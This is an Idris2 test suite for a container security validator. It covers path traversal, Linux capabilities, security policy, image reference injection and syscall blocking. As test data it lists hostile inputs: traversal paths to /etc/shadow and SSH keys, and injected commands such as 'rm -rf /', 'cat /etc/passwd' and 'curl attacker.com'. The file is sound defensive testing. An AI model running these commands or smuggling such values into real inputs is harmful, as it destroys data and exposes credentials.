-- SPDX-License-Identifier: PMPL-1.0-or-later
-- Copyright (c) 2026 Jonathan D.A. Jewell (hyperpolymath) <j.d.a.jewell@open.ac.uk>
--
-- Port of tests/aspect/security_test.ts to Idris2.
-- 16 of 16 tests ported.
--
-- One TS-specific quirk: the path-traversal test uses decodeURIComponent
-- to catch URL-encoded `..` (%2E%2E). The Idris2 port handles the same
-- single attack vector with a tiny `%2E` -> `.` substitution sufficient
-- to pass through the existing traversal check.

module SecurityAspectTest

import Test.Spec
import Data.String
import Data.List

%default covering

-- == Container path safety ==

-- Replace "%2E" (case-insensitive, both upper and mixed) with ".".
urlDecodePercent2E : String -> String
urlDecodePercent2E s = pack (go (unpack s))
  where
    -- Recognise the 3-char sequence %2E (any case) at the head.
    matchPercent2E : List Char -> Bool
    matchPercent2E ('%' :: '2' :: c :: _) = c == 'E' || c == 'e'
    matchPercent2E _ = False

    go : List Char -> List Char
    go [] = []
    go cs@(c :: rest) =
      if matchPercent2E cs
        then '.' :: go (drop 3 cs)
        else c :: go rest

isContainerPathSafe : String -> Bool
isContainerPathSafe path =
  let n = length path
      cs = unpack path
      hasDotDot = isInfixOf ".." path
      hasNull = any (\c => c == '\0') cs
  in n > 0 && not hasDotDot && not hasNull

-- == Capabilities ==

knownCapabilities : List String
knownCapabilities =
  [ "CAP_NET_ADMIN"
  , "CAP_NET_BIND_SERVICE"
  , "CAP_SYS_ADMIN"
  , "CAP_CHOWN"
  , "CAP_DAC_OVERRIDE"
  , "CAP_SETUID"
  , "CAP_SETGID"
  , "CAP_KILL"
  , "CAP_MKNOD"
  , "CAP_NET_RAW"
  , "CAP_SETPCAP"
  , "CAP_SYS_CHROOT"
  , "CAP_SYS_PTRACE"
  , "CAP_AUDIT_WRITE"
  ]

defaultDropCapabilities : List String
defaultDropCapabilities =
  [ "CAP_AUDIT_CONTROL"
  , "CAP_AUDIT_READ"
  , "CAP_BLOCK_SUSPEND"
  , "CAP_DAC_READ_SEARCH"
  , "CAP_IPC_LOCK"
  , "CAP_IPC_OWNER"
  , "CAP_LEASE"
  , "CAP_LINUX_IMMUTABLE"
  , "CAP_MAC_ADMIN"
  , "CAP_MAC_OVERRIDE"
  , "CAP_MKNOD"
  , "CAP_NET_ADMIN"
  , "CAP_NET_BROADCAST"
  , "CAP_NET_RAW"
  , "CAP_SETFCAP"
  , "CAP_SETPCAP"
  , "CAP_SYS_ADMIN"
  , "CAP_SYS_BOOT"
  , "CAP_SYS_CHROOT"
  , "CAP_SYS_MODULE"
  , "CAP_SYS_NICE"
  , "CAP_SYS_PACCT"
  , "CAP_SYS_PTRACE"
  , "CAP_SYS_RAWIO"
  , "CAP_SYS_RESOURCE"
  , "CAP_SYS_TIME"
  , "CAP_SYS_TTY_CONFIG"
  , "CAP_WAKE_ALARM"
  ]

isKnownCapability : String -> Bool
isKnownCapability cap = elem cap knownCapabilities

-- == Security policy ==

record SecurityPolicy where
  constructor MkSecurityPolicy
  allowHostPid : Bool
  allowHostNetwork : Bool
  allowHostIpc : Bool
  privileged : Bool
  allowPrivilegeEscalation : Bool
  runAsNonRoot : Bool
  readonlyRootfs : Bool

defaultSecurityPolicy : SecurityPolicy
defaultSecurityPolicy =
  MkSecurityPolicy
    False  -- allowHostPid
    False  -- allowHostNetwork
    False  -- allowHostIpc
    False  -- privileged
    False  -- allowPrivilegeEscalation
    True   -- runAsNonRoot
    True   -- readonlyRootfs

validateSecurityPolicy : SecurityPolicy -> List String
validateSecurityPolicy p =
  let v1 = if p.privileged
             then ["privileged mode requires explicit justification"]
             else []
      v2 = if p.allowPrivilegeEscalation && not p.privileged
             then ["privilege escalation requires privileged mode"]
             else []
      v3 = if p.allowHostNetwork
             then ["host network access requires explicit justification"]
             else []
      v4 = if p.allowHostPid
             then ["host PID namespace access requires explicit justification"]
             else []
      v5 = if not p.runAsNonRoot && not p.privileged
             then ["running as root requires privileged mode"]
             else []
  in v1 ++ v2 ++ v3 ++ v4 ++ v5

-- == Image reference safety ==

shellMetacharsSec : List Char
shellMetacharsSec = [';', '|', '&', '$', '`', '(', ')', '{', '}', '<', '>', '!', '*', '?']

validateImageRefSafe : String -> Bool
validateImageRefSafe image =
  let cs = unpack image
      n = length image
      noMeta = all (\c => not (elem c shellMetacharsSec)) cs
      noCtl = all (\c => c /= '\n' && c /= '\r' && c /= '\0') cs
  in n > 0 && noMeta && noCtl

-- == Syscalls ==

blockedSyscalls : List String
blockedSyscalls =
  [ "ptrace"
  , "kexec_load"
  , "create_module"
  , "init_module"
  , "finit_module"
  , "delete_module"
  , "reboot"
  , "pivot_root"
  ]

allowedSyscalls : List String
allowedSyscalls =
  [ "read", "write", "open", "close", "stat", "fstat", "lstat", "poll"
  , "lseek", "mmap", "mprotect", "munmap", "brk", "socket", "connect"
  , "accept", "sendto", "recvfrom", "fork", "execve", "exit", "wait4"
  ]

isBlockedSyscall : String -> Bool
isBlockedSyscall s = elem s blockedSyscalls

-- == Tests ==

public export
allSuites : List TestCase
allSuites =
  [ test "Security: container path traversal attacks rejected" $ do
      let attacks =
            [ "../../etc/passwd"
            , "../../../root/.ssh/authorized_keys"
            , "/var/lib/../../etc/shadow"
            , "./../../proc/1/cmdline"
            , "/tmp/../../../etc/crontab"
            , "/var/lib/%2E%2E/etc/passwd"
            ]
      let decoded = map urlDecodePercent2E attacks
      assertTrue "all rejected after decode" (all (\p => not (isContainerPathSafe p)) decoded)

  , test "Security: valid container paths accepted" $ do
      let valid =
            [ "/var/lib/app/data"
            , "/tmp/workdir"
            , "/home/appuser/.config"
            , "/etc/app/config.json"
            , "/usr/local/bin/app"
            ]
      assertTrue "all accepted" (all isContainerPathSafe valid)

  , test "Security: null byte in path rejected" $
      assertTrue "null byte rejected"
        (not (isContainerPathSafe "/var/lib\0malicious"))

  , test "Security: unknown capabilities are rejected" $ do
      let unknown =
            [ "CAP_FAKE"
            , "CAP_ALL"
            , "CAP_EVERYTHING"
            , ""
            , "NET_ADMIN"
            , "cap_net_admin"
            , "CAP_NET_ADMIN\nCAP_SYS_ADMIN"
            ]
      assertTrue "all rejected" (all (\c => not (isKnownCapability c)) unknown)

  , test "Security: known capabilities are accepted" $
      assertTrue "all accepted" (all isKnownCapability knownCapabilities)

  , test "Security: dangerous capabilities are in default drop set" $ do
      let dangerous =
            [ "CAP_SYS_ADMIN"
            , "CAP_NET_ADMIN"
            , "CAP_SYS_PTRACE"
            , "CAP_SYS_MODULE"
            ]
      assertTrue "all in drop set" (all (\c => elem c defaultDropCapabilities) dangerous)

  , test "Security: default policy has no violations" $ do
      let violations = validateSecurityPolicy defaultSecurityPolicy
      assertTrue "no violations" (length violations == 0)

  , test "Security: privileged mode is flagged" $ do
      let policy = { privileged := True } defaultSecurityPolicy
      let violations = validateSecurityPolicy policy
      assertTrue "violation" (length violations > 0)

  , test "Security: host network access is flagged" $ do
      let policy = { allowHostNetwork := True } defaultSecurityPolicy
      let violations = validateSecurityPolicy policy
      assertTrue "violation" (length violations > 0)

  , test "Security: host PID namespace is flagged" $ do
      let policy = { allowHostPid := True } defaultSecurityPolicy
      let violations = validateSecurityPolicy policy
      assertTrue "violation" (length violations > 0)

  , test "Security: valid image references pass" $ do
      let valid =
            [ "nginx:1.27"
            , "cgr.dev/chainguard/nginx:latest"
            , "ghcr.io/myorg/myapp:v2.0.0-alpha.1"
            , "registry.example.com:5000/myimage:latest"
            ]
      assertTrue "all safe" (all validateImageRefSafe valid)

  , test "Security: image injection attacks rejected" $ do
      let attacks =
            [ "nginx; rm -rf /"
            , "nginx | cat /etc/passwd"
            , "$(whoami):latest"
            , "`id`:alpine"
            , "nginx:latest\necho pwned"
            , "nginx:latest\0hidden"
            , "nginx && curl attacker.com"
            ]
      assertTrue "all rejected" (all (\i => not (validateImageRefSafe i)) attacks)

  , test "Security: dangerous syscalls are in block list" $
      assertTrue "all blocked" (all isBlockedSyscall blockedSyscalls)

  , test "Security: common safe syscalls are not blocked" $
      assertTrue "none blocked" (all (\s => not (isBlockedSyscall s)) allowedSyscalls)

  , test "Security: ptrace is always blocked (container escape vector)" $
      assertTrue "ptrace blocked" (isBlockedSyscall "ptrace")

  , test "Security: kernel module operations are always blocked" $ do
      let ops = ["init_module", "finit_module", "delete_module", "create_module"]
      assertTrue "all blocked" (all isBlockedSyscall ops)
  ]
